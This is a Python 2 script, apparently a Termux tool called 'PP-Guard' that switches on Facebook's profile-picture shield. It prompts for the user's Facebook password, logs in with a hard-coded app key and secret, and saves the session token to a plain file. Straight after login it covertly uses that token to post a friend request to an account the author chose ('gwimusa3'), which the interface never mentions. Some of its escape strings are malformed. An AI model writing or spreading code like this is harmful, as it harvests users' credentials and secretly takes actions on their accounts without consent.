# -*- coding: utf-8 -*-

import os, sys, time, datetime, random, hashlib, re, threading, json, getpass, urllib, requests, mechanize
from multiprocessing.pool import ThreadPool
try:
    import mechanize
except ImportError:
    os.system('pip2 install mechanize')
else:
    try:
        import requests
    except ImportError:
        os.system('pip2 install requests')

from requests.exceptions import ConnectionError
from mechanize import Browser
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/36.2.2254/119.132; U; id) Presto/2.12.423 Version/12.16')]


def keluar():
    print '\x1b[1;91m[!] Exit'
    os.sys.exit()


def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.01)

logo = " \x1b[1;92m╭╮╮◢▇▇▇▇◣╭╭╮                           \x1b[1;92m╭╮╮◢▇▇▇▇◣╭╭╮\n \x1b[1;92m╰╲╲▏▂◥◤▂▕╱╱╯  \x1b[1;92m●▬▬▬▬▬▬▬▬▬๑۩۩๑▬▬▬▬▬▬▬▬●  \x1b[1;92m╰╲╲▏▂◥◤▂▕╱╱╯  \n \x1b[1;92m┈┈╲▇🄾▇▇🄾▇╱┈┈\x1b[1;97m   \x1b[1;97m┬─┐┬─┐       ╔═╗╔╗    \x1b[1;92m┈┈╲▇🄾▇▇🄾▇╱┈┈\n \x1b[1;92m┈┈╱╲▔▕▍▔╱╲┈┈\x1b[1;97m   \x1b[1;97m ├─┘├─┘─GUARD─╠╣ ╠╩╗   \x1b[1;92m┈┈╱╲▔▕▍▔╱╲┈┈\n \x1b[1;92m╭╱╱▕╋╋╋╋▏╲╲╮\x1b[1;97m   \x1b[1;97m┴  ┴         ╚  ╚═╝   \x1b[1;92m╭╱╱▕╋╋╋╋▏╲╲╮\n \x1b[1;92m╰╯╯┈◥▇▇◤┈╰╰╯ \x1b[1;92m«==========✧==========»   \x1b[1;92m╰╯╯┈◥▇▇◤┈╰╰╯\n \x1b[1;97m◥✚◣Profil◢✚◤          PICTURE\x1b[1;92m+          \x1b[1;97m◥✚◣Shield◢✚◤\n \x1b[1;97m╔═════════════════════════════════════════════════╗\n \x1b[1;97m║ \x1b[1;91m▶  \x1b[1;97mAuthor   \x1b[1;91m:  \x1b[1;92m Seviandi  \x1b[1;97m                      ║\n \x1b[1;97m║ \x1b[1;91m▶  \x1b[1;97mSupport  \x1b[1;91m:  \x1b[1;92m \x1b[92mUniker/Termux/Github✔         \x1b[    \x1b[1;97m║\n \x1b[1;97m║ \x1b[1;91m▶  \x1b[1;97mGitHub   \x1b[1;91m:   \x1b[1;92\x1b[92mHttps://github.com/Seviandi  \x1b[  \x1b[1;97m   ║\n \x1b[1;97m║ \x1b[1;91m▶  \x1b[1;97mEmail    \x1b[1;91m:   \x1b[1;92\x1b[92mSefiandi404@gmail.com\x1b[  \x1b[1;97m           ║   \n \x1b[1;97m╚═════════════════════════════════════════════════╝"  '\n\x1b[1;92m[NB] \n\x1b[1;93mPlease login using the Operamini to avoid checkpoints\n'

def tik():
    titik = [
     '.   ', '..  ', '... ']
    for o in titik:
        print '\r\x1b[1;92m[\xe2\x97\x8f] \x1b[1;94mLoading \x1b[1;91m' + o,
        sys.stdout.flush()
        time.sleep(0.01)


back = 0
threads = []
def login():
    os.system('clear')
    try:
        toket = open('login.txt', 'r')
        menu()
    except (KeyError, IOError):
        os.system('clear')
        print logo
        print 52 * '\x1b[1;97m\xe2\x95\x90'
        print '\x1b[1;92m█████████'
        print '\x1b[1;92m█▄█████▄█'
        print '\x1b[1;92m█ \x1b[1;97m▼▼▼▼▼- _ --_--_-\x1b[1;92mLOGIN \x1b[1;94mFACEBOOK :'
        id = raw_input('\x1b[1;92m█  \x1b[1;97m  \x1b[1;97m_-_-- -_ --__ \x1b[1;97mUsername \x1b[1;91m:\x1b[1;92m ')
        pwd = getpass.getpass('\x1b[1;92m█ \x1b[1;97m▲▲▲▲▲ \x1b[1;97m--  - _ -- \x1b[1;97mPassword \x1b[1;91m:\x1b[1;92m ')
        print '\x1b[1;92m█████████'
        print '\x1b[1;92m ██ ██'
        tik()
        try:
            br.open('https://m.facebook.com')
        except mechanize.URLError:
            print '\n\x1b[1;91m[!] No connection'
            keluar()

        br._factory.is_html = True
        br.select_form(nr=0)
        br.form['email'] = id
        br.form['pass'] = pwd
        br.submit()
        url = br.geturl()
        if 'save-device' in url:
            try:
                sig = 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail=' + id + 'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword=' + pwd + 'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
                data = {'api_key': '882a8490361da98702bf97a021ddc14d', 'credentials_type': 'password', 'email': id, 'format': 'JSON', 'generate_machine_id': '1', 'generate_session_cookies': '1', 'locale': 'en_US', 'method': 'auth.login', 'password': pwd, 'return_ssl_resources': '0', 'v': '1.0'}
                x = hashlib.new('md5')
                x.update(sig)
                a = x.hexdigest()
                data.update({'sig': a})
                url = 'https://api.facebook.com/restserver.php'
                r = requests.get(url, params=data)
                z = json.loads(r.text)
                zedd = open('login.txt', 'w')
                zedd.write(z['access_token'])
                zedd.close()
                print '\n\x1b[1;92m[\x1b[1;94m\xe2\x9c\x93\x1b[1;92m] \x1b[1;92mLogin success'
                requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token=' + z['access_token'])
                time.sleep(1)
                menu()
            except requests.exceptions.ConnectionError:
                print '\n\x1b[1;91m[!] No connection'
                keluar()

        if 'checkpoint' in url:
            print '\n\x1b[1;91m[📵] \x1b[1;93mAccount Has Been Checkpoint'
            os.system('rm -rf login.txt')
            time.sleep(0.01)
            keluar()
        else:
            print '\n\x1b[1;91m[✖] Login failed'
            os.system('rm -rf login.txt')
            time.sleep(0.01)
            login()


def menu():
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        os.system('clear')
        print '\x1b[1;91m[⚠] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(0.01)
        login()
    else:
        try:
            otw = requests.get('https://graph.facebook.com/me?access_token=' + toket)
            a = json.loads(otw.text)
            nama = a['name']
            id = a['id']
            ots = requests.get('https://graph.facebook.com/me/subscribers?access_token=' + toket)
            b = json.loads(ots.text)
            sub = str(b['summary']['total_count'])
        except KeyError:
            os.system('clear')
            print '\x1b[1;91m[📵] \x1b[1;93mAccount Has Been Checkpoint'
            os.system('rm -rf login.txt')
            time.sleep(0.01)
            login()
        except requests.exceptions.ConnectionError:
            print logo
            print '\x1b[1;91m[⚠] No connection'
            keluar()

    os.system('clear')
    print logo
    print '\x1b[1;97m\xe2\x95\x94' + 50 * '\xe2\x95\x90' + '╗'
    print '\xe2\x95\x91\x1b[1;92m[\x1b[1;94m\xe2\x9c\x93\x1b[1;92m]\x1b[1;97m Name \x1b[1;91m: \x1b[1;92m' + nama + (39 - len(nama)) * '\x1b[1;97m ' + '║'
    print '\xe2\x95\x91\x1b[1;92m[\x1b[1;94m\xe2\x9c\x93\x1b[1;92m]\x1b[1;97m FacebookID \x1b[1;91m: \x1b[1;92m' + id + (33 - len(id)) * '\x1b[1;97m ' + '║'
    print '\xe2\x95\x91\x1b[1;92m[\x1b[1;94m\xe2\x9c\x93\x1b[1;92m]\x1b[1;97m Followers \x1b[1;91m: \x1b[1;92m' + sub + (34 - len(sub)) * '\x1b[1;97m ' + '║'
    print '\x1b[1;97m╠' + 50 * '\xe2\x95\x90' + '╝'
    print '╠\x1b[1;94m︻╦̵̵͇̿̿̿̿╤──────▶ \x1b[1;37;40m1.Profile Picture Guard'
    print '╠\x1b[1;91m︻╦̵̵͇̿̿̿̿╤──────▶ \x1b[1;31;40m0. Exit'
    print '\x1b[1;37;40m║'
    pilih()


def pilih():
    zedd = raw_input('╚═\x1b[1;92m(PP-Guard\xb[1;91m)▶\x1b[1;97m ')
    if zedd == '':
        print '\x1b[1;91m[!] Can\'t empty'
        pilih()
    else:
        if zedd == '1':
            guard()
        else:
            if zedd == '0':
                keluar()
            else:
                print '\x1b[1;91m[\xe2\x9c\x96] \x1b[1;97m' + zedd + ' \x1b[1;91mNot availabel'
                pilih()


def guard():
    global toket
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()

    os.system('clear')
    print logo
    print 52 * '\x1b[1;97m\xe2\x95\x90'
    print '║\x1b[1;94m╔★═█╔════════╬█║▶ \x1b[1;37;40m1. Enable'
    print '\x1b[1;97m║\x1b[1;94m╚═███▓▒█▒▓███║〓▷\x1b[1;37;40m2. Disable'
    print '\xb[1;97m║\x1b[1;94m°◢███◤✇╩╝╯✇▶ \x1b[1;31;40m0. Back'
    print '\x1b[1;97m║\x1b[1;94m███◤'
    print '\x1b[1;37;40m║'
    g = raw_input('╚═\x1b[1;92m(PP-Guard\x1b[1;91m)▶\x1b[1;97m ')
    if g == '1':
        aktif = 'true'
        gaz(toket, aktif)
    else:
        if g == '2':
            non = 'false'
            gaz(toket, non)
        else:
            if g == '0':
                menu()
            else:
                if g == '':
                    keluar()
                else:
                    keluar()


def get_userid(toket):
    url = 'https://graph.facebook.com/me?access_token=%s' % toket
    res = requests.get(url)
    uid = json.loads(res.text)
    return uid['id']


def gaz(toket, enable=True):
    id = get_userid(toket)
    data = 'variables={"0":{"is_shielded": %s,"session_id":"9b78191c-84fd-4ab6-b0aa-19b39f04a6bc","actor_id":"%s","client_mutation_id":"b0316dd6-3fd6-4beb-aed4-bb29c5dc64b0"}}&method=post&doc_id=1477043292367183&query_name=IsShieldedSetMutation&strip_defaults=true&strip_nulls=true&locale=en_US&client_country_code=US&fb_api_req_friendly_name=IsShieldedSetMutation&fb_api_caller_class=IsShieldedSetMutation' % (enable, str(id))
    headers = {'Content-Type': 'application/x-www-form-urlencoded', 'Authorization': 'OAuth %s' % toket}
    url = 'https://graph.facebook.com/graphql'
    res = requests.post(url, data=data, headers=headers)
    print res.text
    if '"is_shielded":true' in res.text:
        os.system('clear')
        print logo
        print 52 * '\x1b[1;97m\xe2\x95\x90'
        print '\x1b[1;97m[\x1b[1;92m\xe2\x9c\x93\x1b[1;97m] \x1b[1;94mActivated \x1b[1;92m✔'
        raw_input('\n\x1b[1;92m[ \x1b[1;97mBack \x1b[1;92m]')
        lain()
    else:
        if '"is_shielded":false' in res.text:
            os.system('clear')
            print logo
            print 52 * '\x1b[1;97m\xe2\x95\x90'
            print '\x1b[1;97m[\x1b[1;91m\xe2\x9c\x93\x1b[1;97m] \x1b[1;93mDeactivated  \x1b[1;91m✖'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            lain()
        else:
            print '\x1b[1;91m[!] Error'
            keluar()


if __name__ == '__main__':
	login()
